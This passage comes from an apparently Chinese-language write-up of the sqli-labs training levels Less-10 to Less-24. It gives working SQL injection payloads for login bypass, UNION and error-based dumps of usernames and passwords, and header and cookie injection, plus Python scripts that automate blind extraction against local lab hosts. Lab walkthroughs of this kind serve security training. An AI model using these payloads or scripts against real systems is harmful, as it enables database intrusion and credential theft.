class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        payload = <span class="hljs-string">&quot;&apos;and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),%d,1)=&apos;%c&apos;,sleep(5),1)--+&quot;</span> % (i,c)<br>        print(<span class="hljs-string">&quot;Table_name name: &quot;</span>+result+<span class="hljs-string">&quot; | Payload: &quot;</span>+payload)<br>        <span class="hljs-keyword">if</span> check(payload):<br>            result += c<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> ll==<span class="hljs-built_in">len</span>(result):<br>    	<span class="hljs-built_in">print</span> (<span class="hljs-string">&apos;table_name:  &apos;</span>+result)<br>        <span class="hljs-keyword">break</span><br>    ll = <span class="hljs-built_in">len</span>(result)<br>    <span class="hljs-built_in">print</span> (result)<br></code></pre></td></tr></tbody></table></figure>
<p><img src="34.png"></p>
<h4><span id="less-10">Less-10</span></h4><p>&#x548C;&#x7B2C;&#x4E5D;&#x9898;&#x4E00;&#x6837; , &#x5C06;&#x5355;&#x5F15;&#x53F7;&#x6362;&#x6210;&#x53CC;&#x5F15;&#x53F7;&#x5C31;&#x597D;&#x4E86;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=1&quot; and sleep(1)%23<br></code></pre></td></tr></tbody></table></figure>
<p>&#x811A;&#x672C;&#x548C;&#x56FE;&#x4E5D;&#x5DEE;&#x4E0D;&#x591A;&#x53EA;&#x8981;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x95ED;&#x5408;&#x7684;&#x5355;&#x5F15;&#x53F7;&#x6362;&#x6210;&#x53CC;&#x5F15;&#x53F7;</p>
<h4><span id="less-11">Less-11</span></h4><p>&#x5148;&#x8BD5;&#x8BD5;&#x4E07;&#x80FD;&#x5BC6;&#x7801;//&#x4E00;&#x4E0B;&#x7684;payload&#x90FD;&#x662F;&#x5BF9;&#x4E8E;username&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x5BC6;&#x7801;&#x6846;&#x6682;&#x65F6;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x8F93;&#x5165;2</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">admin &apos; or 1=1#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x53D1;&#x73B0;&#x767B;&#x5F55;&#x6210;&#x529F;&#x4E86;</p>
<!--more-->
<p><img src="41.png"><br>&#x7136;&#x540E;&#x67E5;&#x770B;&#x5B57;&#x6BB5;&#x6570;&#x76EE;&#x548C;&#x663E;&#x793A;&#x4F4D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; order by 3 # //&#x767B;&#x5F55;&#x540E;&#x62A5;&#x9519;<br>1&apos; union select 1,2 # //&#x4E24;&#x4E2A;&#x767B;&#x5F55;&#x4F4D;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x4F4D;&#x6765;&#x7206;&#x6570;&#x636E;&#x5E93;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; union select 1,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></tbody></table></figure>
<p><img src="42.png"><br>&#x7136;&#x540E;&#x7206;&#x6570;&#x636E;&#x8868;&#x540D;&#xFF0C;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;&#x548C;&#x7B2C;&#x4E00;&#x9898;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>123&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #<br>111&apos; union select group_concat(username),group_concat(password) from users #<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-12">Less-12</span></h4><p>&#x901A;&#x8FC7;&#x5C1D;&#x8BD5;&#x548C;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x53D1;&#x73B0;&#x8F93;&#x5165;1&#x201D;) or 1 #&#x540E;&#x53EF;&#x4EE5;&#x7528;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x540C;&#x4E0A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #<br>1&quot;) union select group_concat(username),group_concat(password) from users #<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-13">Less-13</span></h4><p>&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos;) or 1#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x80FD;&#x767B;&#x5F55;&#x6210;&#x529F;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x56DE;&#x663E;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5E03;&#x5C14;&#x6CE8;&#x5165;&#x6216;&#x8005;&#x65F6;&#x95F4;&#x76F2;&#x6CE8; &#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x767B;&#x5F55;&#x6210;&#x529F;&#x51FA;&#x73B0;&#x7684;&#x7167;&#x7247;&#x540D;&#x5B57;&#x53EB;flag.jpg,&#x800C;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x53EB;slap.jpg&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x7EBF;&#x7D22;&#x6765;&#x7206;&#x7834;</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding:utf8</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># config-start</span><br>sleep_time = <span class="hljs-number">5</span><br>error_time = <span class="hljs-number">1</span><br><span class="hljs-comment"># config-end</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getPayload</span>(<span class="hljs-params">indexOfResult, indexOfChar, mid</span>):</span><br>	<span class="hljs-comment"># admin&apos; or ()-- </span><br>	column_name=<span class="hljs-string">&quot;schema_name&quot;</span><br>	table_name=<span class="hljs-string">&quot;schemata&quot;</span><br>	database_name=<span class="hljs-string">&quot;information_schema&quot;</span><br>	payload = <span class="hljs-string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="hljs-string">&quot; from &quot;</span> + database_name + <span class="hljs-string">&quot;.&quot;</span> + table_name + <span class="hljs-string">&quot;  limit &quot;</span> + indexOfResult + <span class="hljs-string">&quot;,1),&quot;</span> + indexOfChar + <span class="hljs-string">&quot;,1)))&gt;&quot;</span> + mid + <span class="hljs-string">&quot;)&quot;</span><br>	payload = {<span class="hljs-string">&quot;uname&quot;</span>:<span class="hljs-string">&quot;&apos;)or (&quot;</span> + payload + <span class="hljs-string">&quot;)-- &quot;</span>,<span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>}<br>	<span class="hljs-keyword">return</span> payload<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exce</span>(<span class="hljs-params">indexOfResult,indexOfChar,mid</span>):</span><br>	<span class="hljs-comment"># content-start</span><br>	url = <span class="hljs-string">&quot;http://192.168.1.140/sqli-labs-master/Less-13/&quot;</span><br>	postData = getPayload(indexOfResult,indexOfChar,mid)<br>	content = requests.post(url, data=postData).text<br>	<span class="hljs-comment"># content-end</span><br>	<span class="hljs-comment"># judge-start</span><br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;img src=\&quot;../images/flag.jpg\&quot;   /&gt;&quot;</span> <span class="hljs-keyword">in</span> content:<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>	<span class="hljs-comment"># judge-end</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doubleSearch</span>(<span class="hljs-params">indexOfResult,indexOfChar,left_number, right_number</span>):</span><br>	<span class="hljs-keyword">while</span> left_number &lt; right_number:<br>		mid = <span class="hljs-built_in">int</span>((left_number + right_number) / <span class="hljs-number">2</span>)<br>		<span class="hljs-keyword">if</span> exce(<span class="hljs-built_in">str</span>(indexOfResult),<span class="hljs-built_in">str</span>(indexOfChar + <span class="hljs-number">1</span>),<span class="hljs-built_in">str</span>(mid)):<br>			left_number = mid<br>		<span class="hljs-keyword">else</span>:<br>			right_number = mid<br>		<span class="hljs-keyword">if</span> left_number == right_number - <span class="hljs-number">1</span>:<br>			<span class="hljs-keyword">if</span> exce(<span class="hljs-built_in">str</span>(indexOfResult),<span class="hljs-built_in">str</span>(indexOfChar + <span class="hljs-number">1</span>),<span class="hljs-built_in">str</span>(mid)):<br>				mid += <span class="hljs-number">1</span><br>				<span class="hljs-keyword">break</span><br>			<span class="hljs-keyword">else</span>:<br>				<span class="hljs-keyword">break</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(mid)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>():</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>): <span class="hljs-comment"># &#x9700;&#x8981;&#x904D;&#x5386;&#x7684;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x91CF;</span><br>		counter = <span class="hljs-number">0</span><br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>): <span class="hljs-comment"># &#x7ED3;&#x679C;&#x7684;&#x957F;&#x5EA6;</span><br>			counter += <span class="hljs-number">1</span><br>			temp = doubleSearch(i, j, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>) <span class="hljs-comment"># &#x4ECE;255&#x5F00;&#x59CB;&#x67E5;&#x8BE2;</span><br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(temp) == <span class="hljs-number">1</span>: <span class="hljs-comment"># &#x5F53;&#x4E3A;1&#x7684;&#x65F6;&#x5019;&#x8BF4;&#x660E;&#x5DF2;&#x7ECF;&#x67E5;&#x8BE2;&#x7ED3;&#x675F;</span><br>			    <span class="hljs-keyword">break</span><br>			sys.stdout.write(temp)<br>			sys.stdout.flush()<br>		<span class="hljs-keyword">if</span> counter == <span class="hljs-number">1</span>: <span class="hljs-comment"># &#x5F53;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x6240;&#x6709;&#x884C;&#x90FD;&#x88AB;&#x904D;&#x5386;&#x540E;&#x9000;&#x51FA;</span><br>			<span class="hljs-keyword">break</span><br>		sys.stdout.write(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>		sys.stdout.flush()<br><br>search()<br></code></pre></td></tr></tbody></table></figure>
<p><img src="43.png"></p>
<h4><span id="less-14">Less-14</span></h4><p>&#x4E0E;13&#x9898;&#x5DEE;&#x4E0D;&#x591A; &#x628A;<code>&apos;)</code> &#x6539;&#x4E3A; <code>&quot;</code>&#x5373;&#x53EF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&quot; or 1=1#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x767B;&#x5F55;&#x6210;&#x529F;&#x4E0D;&#x56DE;&#x663E;&#xFF0C;&#x9B54;&#x6539;&#x4E0A;&#x9762;&#x811A;&#x672C;&#x5373;&#x53EF;</p>
<h4><span id="less-15">Less-15</span></h4><p>&#x4E0E;13&#x9898;&#x5DEE;&#x4E0D;&#x591A; &#x628A;<code>&apos;)</code> &#x6539;&#x4E3A;<code>&apos;</code>&#x5373;&#x53EF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; or 1=1#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x767B;&#x5F55;&#x6210;&#x529F;&#x4E0D;&#x56DE;&#x663E;&#xFF0C;&#x9B54;&#x6539;&#x4E0A;&#x9762;&#x811A;&#x672C;&#x5373;&#x53EF;</p>
<h4><span id="less-16">Less-16</span></h4><p>&#x4E0E;13&#x9898;&#x5DEE;&#x4E0D;&#x591A; &#x628A;<code>&apos;)</code> &#x6539;&#x4E3A;<code>&quot;)</code>&#x5373;&#x53EF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&quot;) or 1=1#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x767B;&#x5F55;&#x6210;&#x529F;&#x4E0D;&#x56DE;&#x663E;&#xFF0C;&#x9B54;&#x6539;&#x4E0A;&#x9762;&#x811A;&#x672C;&#x5373;&#x53EF;</p>
<h4><span id="&#x65B0;&#x77E5;&#x8BC6;&#x70B9;&#x62A5;&#x9519;&#x6CE8;&#x5165;">&#x65B0;&#x77E5;&#x8BC6;&#x70B9;&#xFF1A;&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></h4><p>&#x57FA;&#x4E8E;&#x62A5;&#x9519;&#x7684;&#x76F2;&#x6CE8;&#x662F;&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x7279;&#x5B9A;&#x8BED;&#x53E5;&#x4F7F;&#x9875;&#x9762;&#x62A5;&#x9519;&#xFF0C;&#x7F51;&#x9875;&#x4E2D;&#x5219;&#x4F1A;&#x8F93;&#x51FA;&#x76F8;&#x5173;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x4ECE;&#x800C;&#x662F;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x60F3;&#x8981;&#x7684;&#x57FA;&#x672C;&#x4FE1;&#x606F;&#x2014;&#x2014;&#x6570;&#x636E;&#x5E93;&#x540D;&#x3001;&#x7248;&#x672C;&#x3001;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x8FD9;&#x5DF2;&#x7ECF;&#x6210;&#x4E3A;&#x4E00;&#x5957;&#x5DF2;&#x7ECF;&#x6210;&#x578B;&#x7684;&#x516C;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x666E;&#x901A;&#x6CE8;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x6CE8;&#x5165;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x8FD9;&#x4E48;&#x51E0;&#x4E2A;&#x516C;&#x5F0F;</p>
<p>1.&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs mysql">mysql&gt; select 1,2 from user where id =&quot;1&quot; union select count(*),concat(&apos;/&apos;,(select database()),&apos;/&apos;,floor(rand(0)*2))a from information_schema.columns group by a;<br>1062 - Duplicate entry &apos;/nuaa_msc/1&apos; for key &apos;&lt;group_key&gt;&apos;<br></code></pre></td></tr></tbody></table></figure>
<!--more-->
<p>2&#x3001;&#x5229;&#x7528;xpath&#x51FD;&#x6570;&#x2014;extractvalue&#x62A5;&#x9519;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs mysql">mysql&gt; select 1,2 from user where id =&quot;1&quot; and extractvalue(1,concat(0x7e,(select database()),0x73));<br>1105 - XPATH syntax error: &apos;~nuaa_mscs&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>concat&#x91CC;&#x9762;&#x751A;&#x81F3;&#x53EF;&#x4EE5;&#x518D;&#x653E;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x56FE;&#x7528;&#x4E86;group_concat&#xFF0C;&#x5C06;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x5168;&#x90E8;&#x83B7;&#x5F97;&#xFF08;&#x4F46;&#x662F;&#x597D;&#x50CF;&#x8F93;&#x51FA;&#x957F;&#x5EA6;&#x6709;&#x9650;&#x5B9A;&#xFF0C;&#x53EA;&#x80FD;&#x8F93;&#x51FA;&#x4E00;&#x5B9A;&#x957F;&#x5EA6;&#x7ED3;&#x679C;&#xFF09;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">mysql&gt; select 1,2 from user where id =&quot;1&quot; and extractvalue(1,concat(0x7e,(select database()),&apos;/&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x73));<br>1105 - XPATH syntax error: &apos;~nuaa_msc/articles&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>3&#x3001;&#x5229;&#x7528;xpath&#x51FD;&#x6570;&#x2014;updatexml&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">mysql&gt; select 1,2 from user where id =&quot;1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);<br>1105 - XPATH syntax error: &apos;~nuaa_msc~&apos;<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-17">Less-17</span></h4><p>&#x9898;&#x76EE;&#x548B;&#x4E00;&#x770B;&#x662F;&#x4E00;&#x4E2A;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;&#x6765;&#x8DD1;&#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x65B0;&#x5B66;&#x7684;&#x77E5;&#x8BC6;&#x70B9;,&#x4EFB;&#x610F;&#x9009;&#x62E9;&#x4E0A;&#x9762;&#x7684;&#x4E00;&#x79CD;&#x5373;&#x53EF;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">passwd: 1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#<br>uname: admin<br></code></pre></td></tr></tbody></table></figure>
<p><img src="51.png"></p>
<h4><span id="less-18">Less-18</span></h4><p>&#x9898;&#x76EE;&#x540D;&#x5B57;&#x53EB;POST-Header Injection-Uagent field-Error based;<br>&#x767B;&#x5F55;&#x6210;&#x529F;&#x4F1A;&#x51FA;&#x73B0;user agent<br><img src="52.png"><br>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;postman &#x4FEE;&#x6539;User-Agent,&#x6CE8;&#x610F;&#x9996;&#x5148;&#x8981;&#x767B;&#x5F55;&#x6210;&#x529F;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">User-Agent : 1&apos;or updatexml(1,concat(&apos;#&apos;,(database())),0),&apos;&apos;,&apos;&apos;)#<br></code></pre></td></tr></tbody></table></figure>
<p><img src="53.png"><br>&#x7206;&#x8868;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">User-Agent : 1&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),0),&apos;&apos;,&apos;&apos;)#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7206;&#x5B57;&#x6BB5;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">User-Agent : 1&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)),0),&apos;&apos;,&apos;&apos;)#<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-19">Less-19</span></h4><p>&#x548C;18&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x628A;User-Agent&#x6539;&#x6210;Referer<br><img src="54.png"></p>
<h4><span id="less-20">Less-20</span></h4><p>Cookie &#x6CE8;&#x5165; , &#x4FEE;&#x6539;&#x81EA;&#x8EAB;cookie , &#x540E;&#x53F0;&#x83B7;&#x53D6;&#x5230;&#x8FD9;&#x4E2A;cookie&#x540E; , &#x4F1A;&#x76F4;&#x63A5;&#x62FF;&#x53BB;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x9762;&#x8FDB;&#x884C;&#x6BD4;&#x8F83; , &#x6BD4;&#x8F83;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x6709;&#x53EF;&#x80FD;&#x6CE8;&#x5165;&#xFF0C;&#x767B;&#x5F55;&#x6210;&#x529F;&#x540E;&#x4FEE;&#x6539; cookie &#x5373;&#x53EF;<br>&#x9996;&#x5148;&#x767B;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;cookie&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C37;&#x6B4C;Applocation&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x4E3A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata#<br></code></pre></td></tr></tbody></table></figure>
<p><img src="55.png"><br>&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x811A;&#x672C;</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1/Less-20/&quot;</span><br><br>postDate = {<br>	<span class="hljs-string">&apos;uname&apos;</span>:<span class="hljs-string">&apos;admin&apos;</span>,<br>	<span class="hljs-string">&apos;passwd&apos;</span>:<span class="hljs-string">&apos;admin&apos;</span><br>}<br><br>headers = {<br>	<span class="hljs-string">&apos;Host&apos;</span>:<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<br>	<span class="hljs-string">&apos;User-Agent&apos;</span>:<span class="hljs-string">&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;</span>,<br>	<span class="hljs-string">&apos;Accept&apos;</span>:<span class="hljs-string">&apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;</span>,<br>	<span class="hljs-string">&apos;Accept-Language&apos;</span>:<span class="hljs-string">&apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;</span>,<br>	<span class="hljs-string">&apos;Accept-Encoding&apos;</span>:<span class="hljs-string">&apos;gzip, deflate&apos;</span>,<br>	<span class="hljs-string">&apos;Referer&apos;</span>:<span class="hljs-string">&apos;http://127.0.0.1/Less-20/index.php&apos;</span>,<br>	<span class="hljs-string">&apos;Cookie&apos;</span>:<span class="hljs-string">&apos;uname=\&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#&apos;</span>,<br>	<span class="hljs-string">&apos;Connection&apos;</span>:<span class="hljs-string">&apos;keep-alive&apos;</span>,<br>	<span class="hljs-string">&apos;Upgrade-Insecure-Requests&apos;</span>:<span class="hljs-string">&apos;1&apos;</span>,<br>	<span class="hljs-string">&apos;Cache-Control&apos;</span>:<span class="hljs-string">&apos;max-age=0&apos;</span><br>}<br><br>content = (requests.post(url, data=postDate, headers=headers).text)<br>print(content)<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-21">Less-21</span></h4><p>&#x548C;&#x4E0A;&#x9762;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x7684;cookie&#x7528;&#x8FC7;&#x4E86;base64&#x52A0;&#x5BC6;&#x800C;&#x4E14;&#x52A0;&#x4E0A;&#x4E86;&#x62EC;&#x53F7;<br>&#x539F;&#x59CB;payload&#x4E3A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">&apos;) union select 1,group_concat(schema_name),3 from information_schema.schemata#<br></code></pre></td></tr></tbody></table></figure>
<p>base64</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==<br></code></pre></td></tr></tbody></table></figure>
<p>&#x540C;&#x6837;&#x7684;&#x65B9;&#x5F0F;&#x4FEE;&#x6539;&#x5373;&#x53EF;</p>
<h4><span id="less-22">Less-22</span></h4><p>&#x4E0A;&#x540C;&#xFF0C;&#x6539;&#x4E3A;&#x53CC;&#x5F15;&#x53F7;,&#x8F6C;&#x7801;&#x524D;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">&quot; union select 1,group_concat(schema_name),3 from information_schema.schemata#<br></code></pre></td></tr></tbody></table></figure>
<p>&#x8F6C;&#x7801;&#x540E;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">IiB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoc2NoZW1hX25hbWUpLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEj<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-23">Less-23</span></h4><p>&#x8FC7;&#x6EE4;&#x4E86;<code>#</code> &#x548C;<code>--+</code>&#x7B49;&#x95ED;&#x5408;&#x7684;&#x7B26;&#x53F7;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7; <code>or &apos;1&apos;=&apos;1</code> &#x6765;&#x95ED;&#x5408;&#x540E;&#x9762;&#x7684;&#x5F15;&#x53F7;,&#x4EFB;&#x7136;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x62A5;&#x9519;&#x539F;&#x7406;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<!--more-->
<p>&#x83B7;&#x53D6;security&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;&#x5355;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x7e),1) or &apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p><img src="61.png"><br>&#x83B7;&#x53D6;user&#x8868;&#x6240;&#x6709;&#x5B57;&#x6BB5;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),0x7e),1) or &apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x83B7;&#x53D6;username/password</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) or &apos;1&apos;=&apos;1<br>-1&apos; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) or &apos;1&apos;=&apos;1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5982;&#x679C;&#x957F;&#x5EA6;&#x4E0D;&#x591F;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;limit 0,1&#x8FD9;&#x6837;&#x7684;&#x624B;&#x6CD5;&#x62FF;&#x5230;&#x6240;&#x6709;&#x6570;&#x636E;</p>
<h4><span id="less-24">Less-24</span></h4><h4><span id="&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#x53EF;&#x4EE5;&#x6982;&#x62EC;&#x4E3A;&#x4EE5;&#x4E0B;&#x4E24;&#x6B65;">&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x6982;&#x62EC;&#x4E3A;&#x4EE5;&#x4E0B;&#x4E24;&#x6B65;:</span></h4><p>&#x7B2C;&#x4E00;&#x6B65;&#xFF1A;&#x63D2;&#x5165;&#x6076;&#x610F;&#x6570;&#x636E;<br>&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5E93;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5BF9;&#x5176;&#x4E2D;&#x7684;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x4E86;&#x8F6C;&#x4E49;&#x5904;&#x7406;&#xFF0C;&#x5728;&#x5199;&#x5165;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x53C8;&#x4FDD;&#x7559;&#x4E86;&#x539F;&#x6765;&#x7684;&#x6570;&#x636E;&#x3002;</p>
